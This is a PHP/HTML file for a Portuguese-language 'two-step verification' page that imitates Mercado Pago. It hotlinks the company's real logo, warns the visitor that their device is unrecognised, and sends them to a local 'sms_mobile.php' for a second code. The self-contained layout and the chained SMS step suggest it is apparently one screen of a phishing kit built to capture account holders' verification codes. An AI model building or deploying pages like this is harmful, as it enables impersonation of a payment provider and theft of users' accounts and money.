<?php
// Nenhuma lógica de servidor é necessária para esta tela,
// pois ela é puramente informativa antes do próximo passo.
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificação de duas etapas</title>
    <style>
        :root {
            --cor-amarela: #ffe600;
            --cor-azul: #3483fa;
            --cor-texto-primaria: #333;
            --cor-texto-secundaria: #666;
            --cor-fundo: #fff;
        }
        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: var(--cor-fundo);
            color: var(--cor-texto-primaria);
        }
        .main-header {
            background-color: var(--cor-amarela);
            padding: 12px 24px;
        }
        .main-header img {
            height: 30px;
        }
        main {
            padding: 24px;
        }
        .verification-card {
            background-color: #fff;
            border-radius: 6px;
            box-shadow: 0 1px 4px 0 rgba(0,0,0,.1);
            padding: 40px;
            text-align: center;
            max-width: 520px;
            width: 100%;
            box-sizing: border-box;
            margin: 80px auto 0 auto;
        }
        .card-icon {
            margin-bottom: 24px;
        }
        .card-title {
            font-size: 24px;
            font-weight: 400;
            margin: 0 0 12px 0;
            color: var(--cor-texto-primaria);
        }
        .card-description {
            font-size: 16px;
            color: var(--cor-texto-secundaria);
            line-height: 1.5;
            margin: 0 auto 32px auto;
        }
        .btn {
            display: inline-block;
            padding: 14px 24px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 6px;
            cursor: pointer;
            border: none;
            text-decoration: none;
        }
        .btn-primary {
            background-color: var(--cor-azul);
            color: white;
            min-width: 200px;
        }
    </style>
</head>
<body>

    <header class="main-header">
        <img src="https://http2.mlstatic.com/storage/mobile-on-demand-resources/image/web-private-nav-mp-logo_1X?updatedAt=1746639317789" alt="Mercado Pago">
    </header>

    <main>
        <div class="verification-card">
            <div class="card-icon">
                <svg width="220" height="128" viewBox="0 0 220 128" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M41.25 110H181.25" stroke="#333333" stroke-width="1.5"></path>
                    
                    <path fill-rule="evenodd" clip-rule="evenodd" d="M68.7173 25.0248C68.4644 25.1198 68.2581 25.286 68.114 25.4954C67.9698 25.7051 67.888 25.9581 67.8888 26.225L67.8888 62.0183C67.8305 75.1935 72.2566 87.5343 79.8767 97.3742C87.495 107.212 98.3059 114.55 111.624 117.722C124.335 114.55 135.146 107.212 142.764 97.3742C150.384 87.5343 154.81 75.1935 154.752 62.0183V26.237C154.753 25.9581 154.671 25.7051 154.527 25.4954C154.382 25.286 154.176 25.1198 153.928 25.0265L111.806 9.14343C111.491 9.03749 111.15 9.03749 110.835 9.14343L68.7173 25.0248Z" 
                          fill="#ffe600"> </path>
                    
                    <path fill-rule="evenodd" clip-rule="evenodd" d="M69.0756 24.9796C68.8238 25.0747 68.6183 25.2411 68.4748 25.4508C68.3312 25.6607 68.2498 25.914 68.2505 26.1812L68.2506 62.0167C68.1926 75.2074 72.5999 87.5627 80.1877 97.4143C87.7737 107.264 98.5388 114.61 111.801 117.786C124.457 114.61 135.222 107.264 142.808 97.4143C150.396 87.5627 154.804 75.2074 154.746 62.0167V26.1932C154.746 25.914 154.665 25.6607 154.521 25.4508C154.378 25.2411 154.172 25.0747 153.925 24.9813L111.981 9.07956C111.668 8.97348 111.328 8.97348 111.015 9.07956L69.0756 24.9796Z" 
                          stroke="#333333" stroke-width="1.5">
                    </path>
                    
                    <ellipse cx="111.165" cy="53.6939" rx="22.3729" ry="22.7257" 
                             fill="white" stroke="#333333" stroke-width="1.5">
                    </ellipse>
                    
                    <path d="M97.1197 55.4986L106.049 64.55L125.024 45.3157" 
                          stroke="#333333" stroke-width="2.5">
                    </path>
                </svg>
            </div>
            <h1 class="card-title">Use um segundo método de verificação para confirmar que a conta pertence a você</h1>
            <p class="card-description">Não reconhecemos o dispositivo pelo qual você está acessando. Por segurança, vamos te pedir um segundo método de verificação.</p>
            
            <a href="sms_mobile.php" class="btn btn-primary">Continuar</a>
        </div>
    </main>

</body>
</html>